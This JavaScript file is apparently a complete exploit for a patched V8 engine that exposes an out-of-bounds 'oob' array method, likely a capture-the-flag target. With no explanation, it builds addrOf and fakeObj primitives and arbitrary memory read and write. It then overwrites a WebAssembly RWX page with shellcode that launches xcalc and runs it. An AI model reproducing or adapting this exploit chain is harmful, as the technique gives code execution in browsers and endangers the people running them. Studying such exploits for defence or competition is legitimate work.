var buffer = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);
var wasmModule = new WebAssembly.Module(buffer);
var wasmInstance = new WebAssembly.Instance(wasmModule);
var shellcode = [0x90909090, 0x90909090, 0x782fb848, 0x636c6163, 0x48500000, 0x73752fb8, 0x69622f72, 0x8948506e, 0xc03148e7, 0x89485750, 0xd23148e6, 0x3ac0c748, 0x50000030, 0x4944b848, 0x414c5053, 0x48503d59, 0x3148e289, 0x485250c0, 0xc748e289, 0x00003bc0, 0x050f00];

var floatArr1 = [1.1, 1.2, 1.3, 1.4];
var floatArr1Map = floatArr1.oob();

var arwArr = [floatArr1Map, 1.2, 1.3, 1.4];

var buf = new ArrayBuffer(8);
var f64Buf = new Float64Array(buf);
var uBuf = new Uint32Array(buf);

var tempObj = { "x": 1 };
var tempObjArr = [tempObj];
var tempObjArrMap = tempObjArr.oob();

function ftoi(val) {
    f64Buf[0] = val;
    return BigInt(uBuf[0]) + (BigInt(uBuf[1]) << 32n);
}

function itof(val) {
    uBuf[0] = Number(val & 0xffffffffn);
    uBuf[1] = Number(val >> 32n);
    return f64Buf[0];
}

function fakeObj(addr) {
    floatArr1[0] = itof(addr);
    floatArr1.oob(tempObjArrMap);
    var fakeObject = floatArr1[0];
    floatArr1.oob(floatArr1Map);
    return fakeObject;
}

function addrOf(obj) {
    tempObjArr[0] = obj;
    tempObjArr.oob(floatArr1Map);
    var leak = tempObjArr[0];
    tempObjArr.oob(tempObjArrMap);
    return ftoi(leak);
}

function getArbitraryRead(addr) {
    if (addr % 2n == 0) {
        addr += 1n;
    }
    arwArr[2] = itof(BigInt(addr) - 0x10n);
    var fakeObject = fakeObj(addrOf(arwArr) - 0x20n);
    return ftoi(fakeObject[0]);
}

function initialArbitraryWrite(addr, value) {
    let fakeObject = fakeObj(addrOf(arwArr) - 0x20n);
    arwArr[2] = itof(BigInt(addr) - 0x10n);
    fakeObject[0] = itof(BigInt(value));
}

function arbitraryWrite(addr, value) {
    var buffer = new ArrayBuffer(8);
    var dataView = new DataView(buffer);
    var bufferAddr = addrOf(buffer);
    var backingStore = bufferAddr + 0x20n;
    initialArbitraryWrite(backingStore, addr);
    dataView.setBigUint64(0, BigInt(value), true);
}

function main() {
    var wasmInstAddr = addrOf(wasmInstance);
    var rwxPtr = wasmInstAddr - 0x1n + 0x88n;
    var rwxSection = getArbitraryRead(rwxPtr);
    var buffer = new ArrayBuffer(0x100);
    var dataView = new DataView(buffer);
    var backingStore = addrOf(buffer)+0x20n;
    initialArbitraryWrite(backingStore,rwxSection);
    for(let i=0;i<shellcode.length;i++){
        dataView.setUint32(4*i,shellcode[i],true);
    }
    wasmInstance.exports.main();
}

main();